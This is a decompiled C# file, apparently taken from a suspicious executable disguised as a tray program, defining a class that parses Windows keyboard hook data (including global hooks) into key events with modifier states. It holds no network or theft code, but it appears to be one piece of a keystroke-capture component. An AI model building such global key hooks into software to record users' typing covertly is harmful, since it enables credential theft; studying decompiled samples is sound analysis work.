// Decompiled with JetBrains decompiler
// Type: VERMELHO265MONARCA.Core.MouseKeyHook.KeyEventArgsExt
// Assembly: madre, Version=1.1.2.3, Culture=neutral, PublicKeyToken=null
// MVID: E3E81F5F-5E79-4C7B-AA1D-713B5D376685
// Assembly location: C:\Users\Marcos Abreu\Documents\XPCTRA\idfptray.exe

using System;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using VERMELHO265MONARCA.Core.MouseKeyHook.WinApi;

namespace VERMELHO265MONARCA.Core.MouseKeyHook
{
  public class KeyEventArgsExt : KeyEventArgs
  {
    public KeyEventArgsExt(Keys keyData)
      : base(keyData)
    {
    }

    internal KeyEventArgsExt(Keys keyData, int timestamp, bool isKeyDown, bool isKeyUp)
      : this(keyData)
    {
      this.Timestamp = timestamp;
      this.IsKeyDown = isKeyDown;
      this.IsKeyUp = isKeyUp;
    }

    public int Timestamp { get; private set; }

    public bool IsKeyDown { get; private set; }

    public bool IsKeyUp { get; private set; }

    internal static KeyEventArgsExt FromRawDataApp(CallbackData data)
    {
      IntPtr wparam = data.WParam;
      IntPtr lparam = data.LParam;
      int tickCount = Environment.TickCount;
      uint int64 = (uint) lparam.ToInt64();
      bool flag1 = (int64 & 1073741824U) > 0U;
      bool flag2 = (int64 & 2147483648U) > 0U;
      Keys keyData = KeyEventArgsExt.AppendModifierStates((Keys) (int) wparam);
      bool isKeyDown = !flag1 && !flag2;
      bool isKeyUp = flag1 & flag2;
      return new KeyEventArgsExt(keyData, tickCount, isKeyDown, isKeyUp);
    }

    internal static KeyEventArgsExt FromRawDataGlobal(CallbackData data)
    {
      IntPtr wparam = data.WParam;
      KeyboardHookStruct structure = (KeyboardHookStruct) Marshal.PtrToStructure(data.LParam, typeof (KeyboardHookStruct));
      Keys keyData = KeyEventArgsExt.AppendModifierStates((Keys) structure.VirtualKeyCode);
      int num = (int) wparam;
      bool isKeyDown = num == 256 || num == 260;
      bool isKeyUp = num == 257 || num == 261;
      return new KeyEventArgsExt(keyData, structure.Time, isKeyDown, isKeyUp);
    }

    private static bool CheckModifier(int vKey)
    {
      return ((int) KeyboardNativeMethods.GetKeyState(vKey) & 32768) > 0;
    }

    private static Keys AppendModifierStates(Keys keyData)
    {
      bool flag1 = KeyEventArgsExt.CheckModifier(17);
      bool flag2 = KeyEventArgsExt.CheckModifier(16);
      bool flag3 = KeyEventArgsExt.CheckModifier(18);
      return keyData | (flag1 ? Keys.Control : Keys.None) | (flag2 ? Keys.Shift : Keys.None) | (flag3 ? Keys.Alt : Keys.None);
    }
  }
}
